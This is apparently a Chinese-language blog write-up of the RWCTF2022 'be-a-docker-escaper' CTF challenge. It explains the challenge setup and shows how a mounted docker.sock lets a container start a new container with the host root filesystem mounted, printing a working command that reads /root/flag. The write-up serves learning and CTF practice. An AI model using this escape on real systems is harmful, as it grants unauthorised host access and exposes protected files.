---
title: RWCTF2022 be-a-docker-escaper
date: 2022-01-25 09:30:20
tags:
- CTF
- RW
- docker
---

![](https://raw.githubusercontent.com/CynosureSec/Imagebed/main/img/20220127002559.png)

RWCTF2022 体验赛上没有做出来的 docker 逃逸题目，在这里复现并记录一下

<!-- more -->
## 文件认识

这题看题目就知道是一个 `docker` 逃逸的题目，但是它给的文件中除了一个 `Dockerfile` 外还有 `user-data` 文件夹，最开始我看这题的时候，通过阅读 `dockerfile` 知道它创建了一个 `docker` 容器，然后在 `docker` 容器里创建了一个 `qemu` 虚拟机 ，最后在 `qemu` 虚拟机里又 起了一个 `docker` 容器，将最后的这个 `docker` 容器的 `ssh` 通过 `5555` 端口映射出来，到最初 `docker` 容器里。这个流程我看得十分复杂，想着先按照它所给的 `Dockerfile` 创建一个与题目环境相同的环境，再去做题，并且这题的题目是 `docker` 逃逸，所以我也一直没有弄清楚，它想逃逸的究竟的哪个 `docker` 环境。现在再仔细阅读题目所给的文件，并且通过网络上的 `writeup` 帮助理解，最终弄清楚了这题的漏洞点与如何做这道题，与搭建调试环境。

首先是 **Dockerfile** 文件

通过 `apt` 安装 `tzdata` `ca-certificates` `wget` `qemu-system` `cloud-image-utils` `python3`

并且下载 `focal-server-cloudimg-amd64.img` 镜像

根据 `user-data` 配置文件 以及我们所下载的镜像，重新配置一个新的镜像，这样通过这个镜像启动的系统，会根据我们的配置文件，提前就配置好用户名，密码，软件包，内部文件等等

```docker
RUN DEBIAN_FRONTEND="noninteractive" apt-get -y install tzdata ca-certificates wget qemu-system cloud-image-utils python3

RUN mkdir /home/chall

WORKDIR /home/chall

RUN wget http://cloud-images.ubuntu.com/focal/current/focal-server-cloudimg-amd64.img

COPY ./user-data /home/chall/
COPY ./check.py /home/chall/

RUN cloud-localds user-data.img user-data && \
    qemu-img resize focal-server-cloudimg-amd64.img +20G

```

现在来看 Dockerfile 中 qemu 虚拟机启动的部分

这里一共有两条运行了 `qemu-system-x86_64` 命令，`CMD` 命令后跟的命令是在容器启动后才会运行的命令，所以我们只关注着一条，它通过 `qemu` 启动了我们刚才制作好的镜像，并且运行它

```makefile
RUN qemu-system-x86_64 \
  -drive "file=focal-server-cloudimg-amd64.img,format=qcow2" \
  -drive "file=user-data.img,format=raw" \
  -device rtl8139,netdev=net0 \
  -m 8G \
  -netdev user,id=net0 \
  -smp 4 \
  -nographic

EXPOSE 5555

CMD qemu-system-x86_64 \
  -drive "file=focal-server-cloudimg-amd64.img,format=qcow2" \
  -device rtl8139,netdev=net0 \
  -m 1G \
  -netdev user,id=net0,hostfwd=tcp::5555-:22 \
  -smp 2 \
  -nographic

```

接着来看 **user-data** 文件

这个文件中我们需要关注的代码如下

`apt` 部分 给 `apt` 换源

`packages` 部分 下载了 `docker.io` `openssh-server` 两个软件包

设置了一个名叫 `container` 的用户，并且给他配置了 `ssh` 公钥，私钥在解压题目所给文件时已经给我们了

当进入这个用户时就会启动 `/home/container/run.sh` 这个脚本

并且拉取了 `docker` 中的 `ubuntu` 镜像

`write_files` 部分 创建了 `/home/container/run.sh` 文件 往里面写入 `docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu` 命令，并且这个文件是我们 ssh 连接上来时就会执行的命令

创建了 `/root/flag` 文件 往里面写入 `rwctf{THIS_IS_A_TEST_FLAG}` 这个 flag 是一个假的 flag 但是在远程环境上，这个就应该是题目的 flag 了

```bash
apt:
  primary:
    - arches: [default]
      uri: http://mirrors.aliyun.com/ubuntu/
      search:
        - http://mirrors.aliyun.com/ubuntu/

packages:
  - docker.io
  - openssh-server

groups:
  - docker

users:
  #- name: root
  #  ssh_authorized_keys:
  #    - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbCiWqn8LWe1Btot7vOTchv5MYfTaE8yHShPI6RP+Rx"
  - name: container
    groups: docker
    ssh_authorized_keys:
      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEbCiWqn8LWe1Btot7vOTchv5MYfTaE8yHShPI6RP+Rx"
    shell: /home/container/run.sh

write_files:
  - content: |
      #!/bin/bash
      docker run -i -m 128m -v /var/run/docker.sock:/s ubuntu # You are here!
    path: /home/container/run.sh
    permissions: "0755"
  - content: |
      rwctf{THIS_IS_A_TEST_FLAG}
    permissions: "0000"
    path: /root/flag
  - content: |
      {
        "registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]
      }
    path: /etc/docker/daemon.json

runcmd:
  - docker pull ubuntu
```

所以这道题最后 我们应该是要获取 `qemu` 运行的系统中的 `flag` 文件，并且 `ssh` 连接上去得到的 `shell` 是在 `qemu` 运行系统的 `docker` 容器中，并且不是一个 `root` 用户

## 漏洞点分析

这题的漏洞点 在 `run.sh` 中 在启动 `docker` 容器时 使用了 ` -v /var/run/docker.sock:/s` 参数将系统中的 `/var/run/docker.sock` 文件挂载到容器中 `/s` 文件。

先来说说 `docker.sock` 这个文件是什么。

摘录至网上

>The docker.sock is a default UNIX socket. Sockets are the communication between localhost and processes. Docker default listens to a docker.sock. If your running in localhost then you can use /var/run/docker.sock method to manage containers.

`docker.sock` 这个文件就是 `UNIX` 的一个接口，这个接口用于系统与进程的通信， `docker` 会默认监听这个接口，当我们运行 `docker` 的命令时候就会通过这个接口去管理 `docker` 的容器

所以我们将这个文件挂载进了一个容器中，在这个容器中我们就可以通过与这个文件通信，来运行 `dokcer` 中的一些命令，甚至于是创建新容器，并且将系统中的任意目录挂载到我们新创建的容器中，通过读取或修改新创建的容器中的文件，我们就可以读取或修改原来主机的文件，也就达到了逃逸的目的。

将 `docker.sock` 挂载进容器中并不是一件少见的事，比如我们需要在容器中创建新的 `docker` 容器，那么这样做就可以减少 docker daemon 带来的性能损失。

使用HTTP请求通过docker.sock发送给Docker daemon，使用它，我们就可以运行一些能够管理Docker的Docker容器，比如Portainer、Kubernetes

## 调试部分

首先我们使用 `docker run -ti --rm -v /var/run/docker.sock:/var/run/docker.sock docker` 命令创建一个新 环境为 dokcer 的容器，并且将 docker.sock 挂载到我们新创建容器的相同目录下

在容器里运行 `docker ps -a` 命令 发现我们得到的结果，与直接在主机里运行相同命令得到的结果是一样的，说明这个容器具有了主机里执行 docker 命令的权限

>❯ docker run -ti --rm -v /var/run/docker.sock:/var/run/docker.sock docker
Unable to find image 'docker:latest' locally
latest: Pulling from library/docker
59bf1c3509f3: Pull complete
1ea03e1895df: Pull complete
1ff98835b055: Pull complete
a3f2dd7b7d65: Pull complete
d182b62d4a35: Pull complete
d7a57db2abd7: Pull complete
73490af52bd3: Pull complete
Digest: sha256:a729cce205a05b0b86dc8dca87823efaffc3f74979fe7dc86a707c2fbf631b61
Status: Downloaded newer image for docker:latest
/ # docker ps -a
CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS                    PORTS                                       NAMES
2f40d03d8fc3   docker               "docker-entrypoint.s…"   57 seconds ago   Up 56 seconds                                                         xenodochial_bhabha
9215e824d67d   ba6acccedd29         "/bin/bash"              23 hours ago     Up 23 hours               0.0.0.0:5212->5212/tcp, :::5212->5212/tcp   clodreve
c6b99ec4c62c   ctf_go_v1            "/bin/bash"              31 hours ago     Up 31 hours               0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   sleepy_mcnulty
bd69b801183e   docker_escape:v1.0   "/bin/bash"              4 days ago       Exited (0) 31 hours ago                                               dreamy_tu
daeae829770c   1c4cc47f56e3         "/start.sh"              4 weeks ago      Up 3 weeks                0.0.0.0:1234->9999/tcp                      peaceful_varahamihira
/ #

然后对于与题目部分相同的环境，我们可以使用命令 `docker run -i -v /var/run/docker.sock:/s ubuntu:20.04` 创建一个容器

然后通过对映射文件`/s`的 docker 命令的操作，我们可以创建新容器，将目录映射到新容器，然后就可以输出 flag 了

命令如下

```
sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.aliyun.com/g" /etc/apt/sources.list
apt update
apt install -y docker.io
docker -H unix:///s run --rm -v /:/r ubuntu:20.04 cat /r/root/flag
```

>docker -H unix:///s run --rm -v /:/r ubuntu:20.04 cat /r/root/flag
ea362f368469: Verifying Checksum
ea362f368469: Download complete
ea362f368469: Pull complete
Digest: sha256:b5a61709a9a44284d88fb12e5c48db0409cfad5b69d4ff8224077c57302df9cf
Status: Downloaded newer image for ubuntu:latest
flag{This_is_a_fake_flag}

通过运行结果可以发现输出了我们设置的 fake flag


**参考资料:**

rwctf2022体验赛 debugger & docker
https://lingze.xyz/pages/c796d2/#be-a-docker-escaper

Docker escape
https://z3ratu1.github.io/Docker%20Escape.html

Run Docker In Docker
https://vinodhakumara2681997.medium.com/run-docker-in-docker-42f381fe6b4f

Docker-in-Docker vs Docker-out-of-Docker
http://tdongsi.github.io/blog/2017/04/23/docker-out-of-docker/

Docker Tips : about /var/run/docker.sock
https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd
